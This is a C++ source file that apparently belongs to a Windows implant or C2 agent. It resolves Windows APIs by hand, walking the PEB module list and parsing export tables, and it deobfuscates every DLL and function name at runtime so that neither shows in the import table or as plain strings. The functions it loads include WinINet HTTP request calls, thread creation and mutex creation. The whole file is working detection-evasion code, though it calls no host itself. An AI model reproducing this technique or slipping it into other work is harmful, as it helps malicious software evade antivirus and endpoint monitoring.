#include <windows.h>
#include <wchar.h>
#include <winternl.h>
#include "utils/buffer.h"
#include "constants.h"
#include "utils/winapi.h"

/* Global */
HMODULE hNtdll = NULL;

/* Helper methods */

HMODULE GetModuleHandleCustom(PCHAR moduleName)
{
	// Get PEB from GS register (for x64) or FS register (for x86)
#ifdef _WIN64
	PPEB pPeb = (PPEB)((PBYTE)(__readgsqword(96)));
#elif _WIN32
	PPEB pPeb = (PPEB)((PBYTE)(__readfsdword(48)));
#endif

	// Convert module name from ASCII to Unicode
	WCHAR moduleNameW[MAX_PATH * sizeof(WCHAR)];
	Utf8ToWideString(moduleName, moduleNameW);

	// Cycle through modules and select the necessary one
	LIST_ENTRY listEntry = pPeb->Ldr->InMemoryOrderModuleList;
	PLDR_DATA_TABLE_ENTRY pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)listEntry.Flink;
	PLDR_DATA_TABLE_ENTRY pDataTableEntryFirst = (PLDR_DATA_TABLE_ENTRY)listEntry.Flink;
	WCHAR dllNameCurrLower[MAX_PATH];
	WCHAR moduleNameWLower[MAX_PATH];

	RtlZeroMemoryCustom((PBYTE)moduleNameWLower, MAX_PATH);
	WideStringToLower(moduleNameW, moduleNameWLower);

	while (TRUE)
	{
		// If current module's name matches, return address to it
		RtlZeroMemoryCustom((PBYTE)dllNameCurrLower, MAX_PATH);
		WideStringToLower(pDataTableEntry->FullDllName.Buffer, dllNameCurrLower);
		if (lstrcmpW(dllNameCurrLower, moduleNameWLower) == 0)
		{
			return (HMODULE)pDataTableEntry->Reserved2[0];
		}

		// Move to next entry
		pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pDataTableEntry->Reserved1[0];

		// Break if we reach first element of the circular linked list
		if (pDataTableEntry == pDataTableEntryFirst)
		{
			break;
		}
	}

	// If execution comes here, it means module was not found
	return NULL;
}

PVOID GetProcAddressCustom(HMODULE hModule, PCHAR procName)
{
	// Get length of Procedure name
	DWORD procNameSize = StrLen(procName);

	// Get export data directory
	PBYTE pModuleBase = (PBYTE)hModule;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pModuleBase + pDosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pDirectoryExport = (PIMAGE_EXPORT_DIRECTORY)(pModuleBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD pAddressOfNames = (PDWORD)(pModuleBase + (pDirectoryExport->AddressOfNames));
	PWORD pAddressOfOrdinals = (PWORD)(pModuleBase + (pDirectoryExport->AddressOfNameOrdinals));
	PDWORD pAddressOfFunctions = (PDWORD)(pModuleBase + (pDirectoryExport->AddressOfFunctions));
	PVOID pProc = NULL;

	// Prepare strings for forwarded functions check
	CHAR strNtdllDot[STRING_NTDLL_DOT_LEN + 1] = "";
	DeobfuscateUtf8String(
		(PCHAR)STRING_NTDLL_DOT,
		STRING_NTDLL_DOT_LEN,
		strNtdllDot);

	for (int i = 0; i < pDirectoryExport->NumberOfNames; i++)
	{
		PCHAR procNameCurr = (PCHAR)pModuleBase + pAddressOfNames[i];

		if (CompareBuffer(procNameCurr, procName, procNameSize))
		{
			pProc = (PVOID)(pModuleBase + pAddressOfFunctions[pAddressOfOrdinals[i]]);

			// Check for forwarded function; if found, resolve it recursively
			if (CompareBuffer(pProc, strNtdllDot, STRING_NTDLL_DOT_LEN))
			{
				return GetProcAddressCustom(hNtdll, (PCHAR)pProc + STRING_NTDLL_DOT_LEN);
			}

			// If not a forwarded function, return found pointer directly
			else
				return pProc;
		}
	}

	return NULL;
}

HMODULE LoadLibraryCustom(IN PCHAR moduleName)
{
	// Check if library is already loaded; if yes, return its handle
	HMODULE hModuleExisting = GetModuleHandleCustom(moduleName);
	if (hModuleExisting != NULL)
	{
		return hModuleExisting;
	}

	// If library is not already loaded, load it and then return its handle
	else
	{
		// Get handle to Kernel32.dll
		CHAR strKernel32Dll[STRING_KERNEL32_DLL_LEN + 1] = "";
		DeobfuscateUtf8String(
			(PCHAR)STRING_KERNEL32_DLL,
			STRING_KERNEL32_DLL_LEN,
			strKernel32Dll);
		HMODULE hKernel32 = GetModuleHandleCustom(strKernel32Dll);
		if (hKernel32 == NULL)
		{
			return (HMODULE)0;
		}

		// Get LoadLibraryA() address
		CHAR strLoadLibraryA[STRING_LOAD_LIBRARY_A_LEN + 1] = "";
		DeobfuscateUtf8String(
			(PCHAR)STRING_LOAD_LIBRARY_A,
			STRING_LOAD_LIBRARY_A_LEN,
			strLoadLibraryA);
		PVOID pLoadLibraryA = GetProcAddressCustom(hKernel32, strLoadLibraryA);
		if (pLoadLibraryA == NULL)
		{
			return (HMODULE)0;
		}
		HMODULE (*LoadLibraryA)(PCHAR moduleName) = (HMODULE(*)(PCHAR))pLoadLibraryA;

		// Use LoadLibraryA
		return LoadLibraryA(moduleName);
	}
}

DWORD FreeLibraryCustom(IN HMODULE hModule)
{
	// Get handle to Kernel32.dll
	CHAR strKernel32Dll[STRING_KERNEL32_DLL_LEN + 1] = "";
	DeobfuscateUtf8String(
		(PCHAR)STRING_KERNEL32_DLL,
		STRING_KERNEL32_DLL_LEN,
		strKernel32Dll);
	HMODULE hKernel32 = GetModuleHandleCustom(strKernel32Dll);
	if (hKernel32 == NULL)
	{
		return GetLastError();
	}

	// Get FreeLibrary() address
	CHAR strFreeLibrary[STRING_FREE_LIBRARY_LEN + 1] = "";
	DeobfuscateUtf8String(
		(PCHAR)STRING_FREE_LIBRARY,
		STRING_FREE_LIBRARY_LEN,
		strFreeLibrary);
	PVOID pFreeLibrary = GetProcAddressCustom(hKernel32, strFreeLibrary);
	if (pFreeLibrary == NULL)
	{
		return GetLastError();
	}
	BOOL (*FreeLibrary)(HMODULE hLibModule) = (BOOL(*)(HMODULE))pFreeLibrary;

	// Use FreeLibrary
	if (!FreeLibrary(hModule))
	{
		return GetLastError();
	}

	return 0;
}

/* Class for WinAPI functions */
WinApiCustom::WinApiCustom()
{
	// Get necessary strings for modules
	static CHAR strNtdllDll[STRING_NTDLL_DLL_LEN + 1] = ""; // "ntdll.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_NTDLL_DLL,
		STRING_NTDLL_DLL_LEN,
		strNtdllDll);

	static CHAR strKernel32Dll[STRING_KERNEL32_DLL_LEN + 1] = ""; // "Kernel32.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_KERNEL32_DLL,
		STRING_KERNEL32_DLL_LEN,
		strKernel32Dll);

	static CHAR strUser32Dll[STRING_USER32_DLL_LEN + 1] = ""; // "User32.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_USER32_DLL,
		STRING_USER32_DLL_LEN,
		strUser32Dll);

	static CHAR strWininetDll[STRING_WININET_DLL_LEN + 1] = ""; // "Wininet.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_WININET_DLL,
		STRING_WININET_DLL_LEN,
		strWininetDll);

	static CHAR strBcryptDll[STRING_BCRYPT_DLL_LEN + 1] = ""; // "Bcrypt.dll"
	DeobfuscateUtf8String(
		(PCHAR)STRING_BCRYPT_DLL,
		STRING_BCRYPT_DLL_LEN,
		strBcryptDll);

	// Get necessary strings for functions
	static CHAR strMessageBoxA[STRING_MESSAGEBOX_A_LEN + 1] = ""; // "MessageBoxA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_MESSAGEBOX_A,
		STRING_MESSAGEBOX_A_LEN,
		strMessageBoxA);

	static CHAR strLoadLibraryA[STRING_LOAD_LIBRARY_A_LEN + 1] = ""; // "LoadLibraryA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_LOAD_LIBRARY_A,
		STRING_LOAD_LIBRARY_A_LEN,
		strLoadLibraryA);

	static CHAR strFreeLibrary[STRING_FREE_LIBRARY_LEN + 1] = ""; // "FreeLibrary"
	DeobfuscateUtf8String(
		(PCHAR)STRING_FREE_LIBRARY,
		STRING_FREE_LIBRARY_LEN,
		strFreeLibrary);

	static CHAR strInternetOpenA[STRING_INTERNET_OPEN_A_LEN + 1] = ""; // "InternetOpenA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_OPEN_A,
		STRING_INTERNET_OPEN_A_LEN,
		strInternetOpenA);

	static CHAR strInternetConnectA[STRING_INTERNET_CONNECT_A_LEN + 1] = ""; // "InternetConnectA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_CONNECT_A,
		STRING_INTERNET_CONNECT_A_LEN,
		strInternetConnectA);

	static CHAR strHttpOpenRequestA[STRING_HTTP_OPEN_REQUEST_A_LEN + 1] = ""; // "HttpOpenRequestA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HTTP_OPEN_REQUEST_A,
		STRING_HTTP_OPEN_REQUEST_A_LEN,
		strHttpOpenRequestA);

	static CHAR strHttpSendRequestA[STRING_HTTP_SEND_REQUEST_A_LEN + 1] = ""; // "HttpSendRequestA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HTTP_SEND_REQUEST_A,
		STRING_HTTP_SEND_REQUEST_A_LEN,
		strHttpSendRequestA);

	static CHAR strInternetReadFile[STRING_INTERNET_READ_FILE_LEN + 1] = ""; // "InternetReadFile"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_READ_FILE,
		STRING_INTERNET_READ_FILE_LEN,
		strInternetReadFile);

	static CHAR strInternetCloseHandle[STRING_INTERNET_CLOSE_HANDLE_LEN + 1] = ""; // "InternetCloseHandle"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_CLOSE_HANDLE,
		STRING_INTERNET_CLOSE_HANDLE_LEN,
		strInternetCloseHandle);

	static CHAR strInternetSetOptionA[STRING_INTERNET_SET_OPTION_A_LEN + 1] = ""; // "InternetSetOptionA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_INTERNET_SET_OPTION_A,
		STRING_INTERNET_SET_OPTION_A_LEN,
		strInternetSetOptionA);

	static CHAR strGetProcessHeap[STRING_GET_PROCESS_HEAP_LEN + 1] = ""; // "GetProcessHeap"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_PROCESS_HEAP,
		STRING_GET_PROCESS_HEAP_LEN,
		strGetProcessHeap);

	static CHAR strHeapAlloc[STRING_HEAP_ALLOC_LEN + 1] = ""; // "HeapAlloc"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HEAP_ALLOC,
		STRING_HEAP_ALLOC_LEN,
		strHeapAlloc);

	static CHAR strHeapReAlloc[STRING_HEAP_RE_ALLOC_LEN + 1] = ""; // "HeapReAlloc"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HEAP_RE_ALLOC,
		STRING_HEAP_RE_ALLOC_LEN,
		strHeapReAlloc);

	static CHAR strHeapFree[STRING_HEAP_FREE_LEN + 1] = ""; // "HeapFree"
	DeobfuscateUtf8String(
		(PCHAR)STRING_HEAP_FREE,
		STRING_HEAP_FREE_LEN,
		strHeapFree);

	static CHAR strGetLastError[STRING_GET_LAST_ERROR_LEN + 1] = ""; // "GetLastError"
	DeobfuscateUtf8String(
		(PCHAR)STRING_GET_LAST_ERROR,
		STRING_GET_LAST_ERROR_LEN,
		strGetLastError);

	static CHAR strBCryptOpenAlgorithmProvider[STRING_BCRYPT_OPEN_ALGORITHM_PROVIDER_LEN + 1] = ""; // "BCryptOpenAlgorithmProvider"
	DeobfuscateUtf8String(
		(PCHAR)STRING_BCRYPT_OPEN_ALGORITHM_PROVIDER,
		STRING_BCRYPT_OPEN_ALGORITHM_PROVIDER_LEN,
		strBCryptOpenAlgorithmProvider);

	static CHAR strBCryptCloseAlgorithmProvider[STRING_BCRYPT_CLOSE_ALGORITHM_PROVIDER_LEN + 1] = ""; // "BCryptCloseAlgorithmProvider"
	DeobfuscateUtf8String(
		(PCHAR)STRING_BCRYPT_CLOSE_ALGORITHM_PROVIDER,
		STRING_BCRYPT_CLOSE_ALGORITHM_PROVIDER_LEN,
		strBCryptCloseAlgorithmProvider);

	static CHAR strBCryptGenRandom[STRING_BCRYPT_GEN_RANDOM_LEN + 1] = ""; // "BCryptGenRandom"
	DeobfuscateUtf8String(
		(PCHAR)STRING_BCRYPT_GEN_RANDOM,
		STRING_BCRYPT_GEN_RANDOM_LEN,
		strBCryptGenRandom);

	static CHAR strCreateThread[STRING_CREATE_THREAD_LEN + 1] = ""; // "CreateThread"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_THREAD,
		STRING_CREATE_THREAD_LEN,
		strCreateThread);

	static CHAR strCreateMutexA[STRING_CREATE_MUTEX_A_LEN + 1] = ""; // "CreateMutexA"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CREATE_MUTEX_A,
		STRING_CREATE_MUTEX_A_LEN,
		strCreateMutexA);

	static CHAR strWaitForSingleObject[STRING_WAIT_FOR_SINGLE_OBJECT_LEN + 1] = ""; // "WaitForSingleObject"
	DeobfuscateUtf8String(
		(PCHAR)STRING_WAIT_FOR_SINGLE_OBJECT,
		STRING_WAIT_FOR_SINGLE_OBJECT_LEN,
		strWaitForSingleObject);

	static CHAR strReleaseMutex[STRING_RELEASE_MUTEX_LEN + 1] = ""; // "ReleaseMutex"
	DeobfuscateUtf8String(
		(PCHAR)STRING_RELEASE_MUTEX,
		STRING_RELEASE_MUTEX_LEN,
		strReleaseMutex);

	static CHAR strCloseHandle[STRING_CLOSE_HANDLE_LEN + 1] = ""; // "CloseHandle"
	DeobfuscateUtf8String(
		(PCHAR)STRING_CLOSE_HANDLE,
		STRING_CLOSE_HANDLE_LEN,
		strCloseHandle);

	// Load necessary modules
	loadedModules.hNtdll = LoadLibraryCustom(strNtdllDll);
	loadedModules.hKernel32 = LoadLibraryCustom(strKernel32Dll);
	loadedModules.hUser32 = LoadLibraryCustom(strUser32Dll);
	loadedModules.hWininet = LoadLibraryCustom(strWininetDll);
	loadedModules.hBcrypt = LoadLibraryCustom(strBcryptDll);

	// Save necessary global module handles
	hNtdll = loadedModules.hNtdll;

	// Load necessary functions
	loadedFunctions.MessageBoxA = (int (*)(HWND, LPCSTR, LPCSTR, UINT))GetProcAddressCustom(loadedModules.hUser32, strMessageBoxA);
	loadedFunctions.LoadLibraryA = (HMODULE(*)(LPCSTR lpLibFileName))GetProcAddressCustom(loadedModules.hKernel32, strLoadLibraryA);
	loadedFunctions.FreeLibrary = (BOOL(*)(HMODULE hLibModule))GetProcAddressCustom(loadedModules.hKernel32, strFreeLibrary);
	loadedFunctions.InternetOpenA = (HINTERNET(*)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags))GetProcAddressCustom(loadedModules.hWininet, strInternetOpenA);
	loadedFunctions.InternetConnectA = (HINTERNET(*)(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext))GetProcAddressCustom(loadedModules.hWininet, strInternetConnectA);
	loadedFunctions.HttpOpenRequestA = (HINTERNET(*)(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR * lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)) GetProcAddressCustom(loadedModules.hWininet, strHttpOpenRequestA);
	loadedFunctions.HttpSendRequestA = (BOOL(*)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength))GetProcAddressCustom(loadedModules.hWininet, strHttpSendRequestA);
	loadedFunctions.InternetReadFile = (BOOL(*)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead))GetProcAddressCustom(loadedModules.hWininet, strInternetReadFile);
	loadedFunctions.InternetCloseHandle = (BOOL(*)(HINTERNET hInternet))GetProcAddressCustom(loadedModules.hWininet, strInternetCloseHandle);
	loadedFunctions.InternetSetOptionA = (BOOL(*)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength))GetProcAddressCustom(loadedModules.hWininet, strInternetSetOptionA);
	loadedFunctions.GetProcessHeap = (HANDLE(*)())GetProcAddressCustom(loadedModules.hKernel32, strGetProcessHeap);
	loadedFunctions.HeapAlloc = (LPVOID(*)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes))GetProcAddressCustom(loadedModules.hKernel32, strHeapAlloc);
	loadedFunctions.HeapReAlloc = (LPVOID(*)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes))GetProcAddressCustom(loadedModules.hKernel32, strHeapReAlloc);
	loadedFunctions.HeapFree = (BOOL(*)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem))GetProcAddressCustom(loadedModules.hKernel32, strHeapFree);
	loadedFunctions.GetLastError = (DWORD(*)())GetProcAddressCustom(loadedModules.hKernel32, strGetLastError);
	loadedFunctions.BCryptOpenAlgorithmProvider = (NTSTATUS(*)(BCRYPT_ALG_HANDLE * phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags)) GetProcAddressCustom(loadedModules.hBcrypt, strBCryptOpenAlgorithmProvider);
	loadedFunctions.BCryptCloseAlgorithmProvider = (NTSTATUS(*)(BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags))GetProcAddressCustom(loadedModules.hBcrypt, strBCryptCloseAlgorithmProvider);
	loadedFunctions.BCryptGenRandom = (NTSTATUS(*)(BCRYPT_ALG_HANDLE hAlgorithm, PUCHAR pbBuffer, ULONG cbBuffer, ULONG dwFlags))GetProcAddressCustom(loadedModules.hBcrypt, strBCryptGenRandom);
	loadedFunctions.CreateThread = (HANDLE(*)(LPSECURITY_ATTRIBUTES lpThreadAttributes, DWORD dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId))GetProcAddressCustom(loadedModules.hKernel32, strCreateThread);
	loadedFunctions.CreateMutexA = (HANDLE(*)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName))GetProcAddressCustom(loadedModules.hKernel32, strCreateMutexA);
	loadedFunctions.WaitForSingleObject = (DWORD(*)(HANDLE hHandle, DWORD dwMilliseconds))GetProcAddressCustom(loadedModules.hKernel32, strWaitForSingleObject);
	loadedFunctions.ReleaseMutex = (BOOL(*)(HANDLE hMutex))GetProcAddressCustom(loadedModules.hKernel32, strReleaseMutex);
	loadedFunctions.CloseHandle = (BOOL(*)(HANDLE hObject))GetProcAddressCustom(loadedModules.hKernel32, strCloseHandle);
}

/* Destructor for WinApiCustom */
WinApiCustom::~WinApiCustom()
{
	// Free library (modules)
	// FreeLibraryCustom(loadedModules.hKernel32); TODO
	FreeLibraryCustom(loadedModules.hUser32);
}

/* WRAPPER FUNCTIONS FOR WinApiCustom */

// Custom heap alloc
LPVOID WinApiCustom::HeapAllocCustom(DWORD sizeOfBufferToAllocate)
{
	return this->loadedFunctions.HeapAlloc(
		this->loadedFunctions.GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeOfBufferToAllocate);
}

// Custom heap free
BOOL WinApiCustom::HeapFreeCustom(LPVOID pBufferToFree)
{
	return this->loadedFunctions.HeapFree(
		this->loadedFunctions.GetProcessHeap(),
		0,
		pBufferToFree);
}

// Custom Heap realloc
LPVOID WinApiCustom::HeapReAllocCustom(LPVOID lpMem, DWORD dwBytes)
{
	return this->loadedFunctions.HeapReAlloc(
		this->loadedFunctions.GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		lpMem,
		dwBytes);
}

// Custom CreateThread
HANDLE WinApiCustom::CreateThreadCustom(LPTHREAD_START_ROUTINE pThreadFunc, LPVOID pThreadFuncParams)
{
	return this->loadedFunctions.CreateThread(
		NULL,
		0,
		pThreadFunc,
		pThreadFuncParams,
		0,
		NULL);
}

// Custom CreateMutex
HANDLE WinApiCustom::CreateMutexCustom()
{
	return this->loadedFunctions.CreateMutexA(NULL, FALSE, NULL);
}